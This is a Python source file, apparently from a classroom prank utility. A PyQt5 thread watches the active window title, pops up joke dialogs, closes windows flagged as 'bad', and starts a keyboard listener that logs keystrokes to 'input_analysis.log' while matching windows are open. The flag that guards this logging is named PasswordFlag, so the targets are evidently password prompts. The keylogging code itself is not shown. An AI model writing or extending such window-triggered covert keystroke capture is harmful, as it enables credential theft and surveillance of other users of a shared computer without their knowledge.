import random, time
from PyQt5.QtCore import QThread, pyqtSignal
import pygetwindow as gw

from .. import config
from ..utils import path, checkNetwork


class GetWindowThread(QThread):
    exitFlag = False
    execer = pyqtSignal(str, tuple)
    logger = pyqtSignal(str)
    stopThread = pyqtSignal()
    ZBDialogFlag = True
    PasswordFlag = False
    debugFormStatus = False

    def __init__(self, width, height):
        super(GetWindowThread, self).__init__()
        self.width = width
        self.height = height
        self.hooks = config.get("WindowTitle.hook")
    
    def forceStop(self):
        self.exitFlag = True
    
    def run(self):
        if checkNetwork(url=config.get("Config.CheckUrl")):
            # 状态异常
            self.ZBDialogFlag = False
            self.execer.emit("changeTrayIcon", (path.path("icon_colored.png"),))
            self.logger.emit("Started ZBDialog Listener.")
        
        # debug
        self.ZBDialogFlag = False

        _oldTitle = None
        while True:
            try:
                if self.exitFlag:
                    break
                window = gw.getActiveWindow()
                if window == None:
                    time.sleep(int(config.get("WindowTitle.Interval")))
                    continue
                title = window.title
                matchFlag = False
                isNewWindow = False
                if _oldTitle != title and self.debugFormStatus:
                    self.execer.emit("setDebugForm", (title,))
                    isNewWindow = True
                    _oldTitle = title
                for i in self.hooks:
                    if not i.get("enable", True):
                        continue
                    if (i.get("title") == title) or (i.get("fuzzyMatching") and i.get("title") in title):
                        matchFlag = True
                        if i.get("handler") == "ZBDialog":
                            if not self.ZBDialogFlag:
                                self.logger.emit("Stopped ZBDialog Listener.")
                                self.openZBDialog(i.get("data", {}))
                                self.execer.emit("changeTrayIcon", (path.path("icon.jpg"),))
                                if i.get("data", {}).get("notify", False):
                                    self.execer.emit("notifySuccess", ("检测到装逼", "已自动打开装逼窗口",))
                                self.ZBDialogFlag = True
                        elif i.get("handler") == "keyboardListener":
                            if not self.PasswordFlag:
                                self.PasswordFlag = True
                                # Start catch keyboard input thread
                                self.execer.emit("runKeyBoardThread", (i.get("data", {}).get("fileName", "input_analysis.log"),))
                                self.logger.emit("Started KeyBoard Listener.")
                        elif i.get("handler") == "closeWindow":
                            if isNewWindow and window != None:
                                window.close()
                                self.logger.emit("Closed Window: " + title)
                                msg = i.get("data", {}).get("msg", "已自动关闭不良界面")
                                if msg and not i.get("data", {}).get("notify", False):
                                    self.execer.emit("showMessage", (msg,))
                                elif msg and i.get("data", {}).get("notify", False):
                                    self.execer.emit("notifySuccess", ("检测到不良界面", msg,))
                if not matchFlag:
                    if self.PasswordFlag:
                        self.PasswordFlag = False
                        # Stop catch keyboard input thread
                        self.execer.emit("stopKeyBoardThread", ())
                        self.logger.emit("Stopped KeyBoard Listener.")
            except Exception as e:
                self.logger.emit(str(e))
            time.sleep(int(config.get("WindowTitle.Interval")))
        self.stopThread.emit()
        self.debugFormStatus = False
    
    def openZBDialog(self, i):
        for _ in range(i.get("times", 5)):
            self.execer.emit(
                "openZBDialog",
                (
                    random.choice(i.get("msg", ["检测到有人在装逼，我不说是谁", "震惊，六班竟然突破了科技封锁", "原神哥真的是太有实力啦"])),
                    self.width,
                    self.height,
                )
            )
            time.sleep(0.4)
